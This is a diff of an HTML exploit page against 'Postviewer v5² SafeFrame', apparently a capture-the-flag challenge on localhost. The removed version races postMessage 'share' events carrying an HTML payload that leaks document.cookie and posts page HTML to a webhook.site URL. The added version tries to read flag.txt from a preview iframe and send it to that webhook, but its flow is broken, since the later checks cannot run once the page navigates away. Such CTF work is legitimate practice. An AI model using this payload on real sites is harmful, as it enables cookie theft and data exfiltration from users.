@@ -2,53 +2,62 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Postviewer v5² SafeFrame Race Exploit (Fixed)</title>
+  <title>Postviewer v5² Improved Exploit</title>
 </head>
 <body>
-  <h1>Running SafeFrame Hijack…</h1>
-  <p>Check your webhook for hits!</p>
+  <h1>Improved SafeFrame Exploit</h1>
+  <p>Check your webhook for flag</p>
 
   <script>
-    const WEBHOOK = 'https://webhook.site/eb547890-9955-4e02-a8ae-3083dba7c032'; // CHANGE THIS!
+    const WEBHOOK = 'https://webhook.site/eb547890-9955-4e02-a8ae-3083dba7c032';
 
-    // Open challenge page
-    const victim = window.open('http://localhost:1338', '_blank');
+    async function exploit() {
+      console.log('[+] Starting improved exploit...');
+      
+      // Step 1: Navigate to localhost:1338 directly
+      setTimeout(() => {
+        window.location.href = 'http://localhost:1338';
+      }, 1000);
 
-    if (!victim) {
-      console.error('Failed to open victim window. Enable popups.');
+      // Step 2: Wait for navigation, then look for flag file
+      setTimeout(async () => {
+        if (window.location.hostname === 'localhost') {
+          console.log('[+] On localhost:1338, looking for flag...');
+          
+          // Look for flag file in the files list
+          const filesList = document.querySelector('#filesList');
+          if (filesList) {
+            const flagFile = Array.from(filesList.children).find(
+              el => el.dataset.name === 'flag.txt'
+            );
+            
+            if (flagFile) {
+              console.log('[+] Found flag file, clicking...');
+              flagFile.click();
+              
+              // Wait for SafeFrame to load, then extract
+              setTimeout(async () => {
+                const iframe = document.querySelector('#previewIframe');
+                if (iframe) {
+                  try {
+                    const content = iframe.contentDocument.body.innerText;
+                    if (content.includes('CTF{')) {
+                      const flag = content.match(/CTF\{[^}]+\}/)[0];
+                      await fetch(`${WEBHOOK}?flag=${encodeURIComponent(flag)}`);
+                      console.log('[+] Flag sent:', flag);
+                    }
+                  } catch (e) {
+                    console.log('[!] SafeFrame access blocked:', e.message);
+                  }
+                }
+              }, 3000);
+            }
+          }
+        }
+      }, 3000);
     }
 
-    // Start race to overwrite the flag file
-    const spamInterval = setInterval(() => {
-      // Safe: no nested <script> in template literal!
-      const payload = `
-        <img src='${WEBHOOK}?img='+document.cookie />
-        <script>fetch('${WEBHOOK}', {
-          method: 'POST',
-          body: document.documentElement.innerHTML
-        })<\/script>
-      `;
-
-      const blob = new Blob([payload], { type: "text/html" });
-
-      victim.postMessage({
-        type: "share",
-        files: [{
-          blob: blob,
-          cached: false,
-          name: "evilfile.txt"
-        }]
-      }, '*');
-
-      console.log('[+] Sent malicious file');
-
-    }, 20);
-
-    setTimeout(() => {
-      clearInterval(spamInterval);
-      console.log('[+] Stopped spamming.');
-    }, 10000);
-
+    exploit();
   </script>
 </body>
 </html>
